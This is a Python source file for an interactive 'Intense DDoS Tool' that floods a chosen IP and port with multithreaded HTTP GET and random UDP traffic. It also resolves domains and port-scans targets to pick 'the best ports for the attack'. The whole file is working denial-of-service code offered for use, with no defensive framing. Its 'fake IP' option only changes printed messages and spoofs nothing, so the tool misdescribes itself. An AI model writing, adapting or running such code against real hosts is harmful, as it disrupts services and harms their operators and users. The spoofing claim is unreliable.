import random
import socket
import threading
import sys
from colorama import Fore, Style, init
from fake_useragent import UserAgent
import dns.resolver

init(autoreset=True)

ua = UserAgent()

colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]

def random_ip():
    return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"

def http_attack(target_ip, target_port, fake_ip, show_packets):
    while True:
        try:
            color = random.choice(colors)

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, target_port))

            msg = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: {ua.random}\r\n\r\n".encode('ascii')
            sock.send(msg)

            if show_packets:
                print(color + f"[+] HTTP attack on {target_ip}:{target_port} from fake IP {fake_ip} - User-Agent: {ua.random}" + Style.RESET_ALL)
            
            sock.close()
        except Exception as e:
            print(Fore.RED + f"[-] Error during attack: {e}" + Style.RESET_ALL)
            continue

def udp_attack(target_ip, target_port, show_packets):
    while True:
        try:
            color = random.choice(colors)
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            msg = random._urandom(1024)  
            sock.sendto(msg, (target_ip, target_port))

            if show_packets:
                print(color + f"[+] UDP packet sent to {target_ip}:{target_port}" + Style.RESET_ALL)

        except Exception as e:
            print(Fore.RED + f"[-] Error while sending UDP packet: {e}" + Style.RESET_ALL)
            continue

def start_attack(target_ip, target_port, fake_ip, threads, show_packets):
    for i in range(threads // 2):
        thread = threading.Thread(target=http_attack, args=(target_ip, target_port, fake_ip, show_packets))
        thread.daemon = True
        thread.start()

    for i in range(threads // 2):
        thread = threading.Thread(target=udp_attack, args=(target_ip, target_port, show_packets))
        thread.daemon = True
        thread.start()

def get_ip_and_ports(domain):
    try:
        if domain.startswith("http://"):
            domain = domain[len("http://"):]

        elif domain.startswith("https://"):
            domain = domain[len("https://"):]

        domain = domain.split('/')[0]

        answers = dns.resolver.resolve(domain, 'A')
        target_ip = answers[0].to_text()
        print(Fore.GREEN + f"[+] IP for the site {domain}: {target_ip}")

        common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 3306, 8080]
        open_ports = []

        print(Fore.YELLOW + "[*] Scanning common ports...")

        for port in common_ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)  
            result = sock.connect_ex((target_ip, port))
            if result == 0:
                open_ports.append(port)
            sock.close()

        if open_ports:
            print(Fore.GREEN + f"[+] Open ports on {target_ip}: {', '.join(map(str, open_ports))}")
        else:
            print(Fore.RED + "[-] No open ports found.")

        return target_ip, open_ports

    except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, dns.resolver.NoNameservers, socket.gaierror):
        print(Fore.RED + "[-] Error: Could not find IP for the site. Check the link.")
        return None, []

def main_menu():
    print(Fore.CYAN + "=========================")
    print(Fore.CYAN + "       Intense DDoS Tool       ")
    print(Fore.CYAN + "=========================")
    print(Fore.GREEN + "[1] Target a specific IP")
    print(Fore.GREEN + "[2] Target using a random fake IP")
    print(Fore.YELLOW + "[3] Get site IP and best ports for attack")
    print(Fore.RED + "[0] Exit")
    print(Fore.CYAN + "=========================")

def main():
    while True:
        main_menu()
        try:
            choice = int(input(Fore.YELLOW + "Choose an option: " + Style.RESET_ALL))

            if choice == 1:
                target_ip = input(Fore.YELLOW + "Enter target IP: " + Style.RESET_ALL)
                target_port = int(input(Fore.YELLOW + "Enter port (Port): " + Style.RESET_ALL))
                fake_ip = input(Fore.YELLOW + "Enter fake IP (or type 'random' to get a random IP): " + Style.RESET_ALL)

                if fake_ip.lower() == 'random':
                    fake_ip = random_ip()

                threads = int(input(Fore.YELLOW + "Enter number of Threads (preferably between 1000-2000): " + Style.RESET_ALL))
                show_packets = input(Fore.YELLOW + "Do you want to display every sent packet? (Yes/No): " + Style.RESET_ALL).lower() == 'yes'

                start_attack(target_ip, target_port, fake_ip, threads, show_packets)

            elif choice == 2:
                target_ip = input(Fore.YELLOW + "Enter target IP: " + Style.RESET_ALL)
                target_port = int(input(Fore.YELLOW + "Enter port (Port): " + Style.RESET_ALL))
                threads = int(input(Fore.YELLOW + "Enter number of Threads (preferably between 1000-2000): " + Style.RESET_ALL))
                show_packets = input(Fore.YELLOW + "Do you want to display every sent packet? (Yes/No): " + Style.RESET_ALL).lower() == 'yes'

                fake_ip = random_ip()

                start_attack(target_ip, target_port, fake_ip, threads, show_packets)

            elif choice == 3:
                domain = input(Fore.YELLOW + "Enter the link (domain) for the site: " + Style.RESET_ALL)
                target_ip, open_ports = get_ip_and_ports(domain)

                if target_ip and open_ports:
                    print(Fore.GREEN + f"[+] You can use this IP: {target_ip} for the attack.")
                    print(Fore.GREEN + f"[+] The best ports for the attack are: {', '.join(map(str, open_ports))}")

            elif choice == 0:
                print(Fore.GREEN + "Exiting... Thank you for using the tool!")
                sys.exit()

            else:
                print(Fore.RED + "Invalid option! Try again.")

        except ValueError:
            print(Fore.RED + "Enter a valid number from the options.")

if __name__ == "__main__":
    main()
